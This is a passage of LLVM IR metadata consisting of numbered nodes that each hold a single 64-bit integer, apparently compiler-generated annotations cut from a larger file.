!10650 = !{i64 268618939}
!10651 = !{i64 268618942}
!10652 = !{i64 268618944}
!10653 = !{i64 268618946}
!10654 = !{i64 268618948}
!10655 = !{i64 268618951}
!10656 = !{i64 268618956}
!10657 = !{i64 268618961}
!10658 = !{i64 268618969}
!10659 = !{i64 268618970}
!10660 = !{i64 268618985}
!10661 = !{i64 268618995}
!10662 = !{i64 268619002}
!10663 = !{i64 268619007}
!10664 = !{i64 268619012}
!10665 = !{i64 268619017}
!10666 = !{i64 268619022}
!10667 = !{i64 268619027}
!10668 = !{i64 268619028}
!10669 = !{i64 268619029}
!10670 = !{i64 268619030}
!10671 = !{i64 268619031}
!10672 = !{i64 268619032}
!10673 = !{i64 268619033}
!10674 = !{i64 268619034}
!10675 = !{i64 268619035}
!10676 = !{i64 268619036}
!10677 = !{i64 268619037}
!10678 = !{i64 268619038}
!10679 = !{i64 268619039}
!10680 = !{i64 268619040}
!10681 = !{i64 268619046}
!10682 = !{i64 268619056}
!10683 = !{i64 268619066}
!10684 = !{i64 268619076}
!10685 = !{i64 268619086}
!10686 = !{i64 268619096}
!10687 = !{i64 268619106}
!10688 = !{i64 268619116}
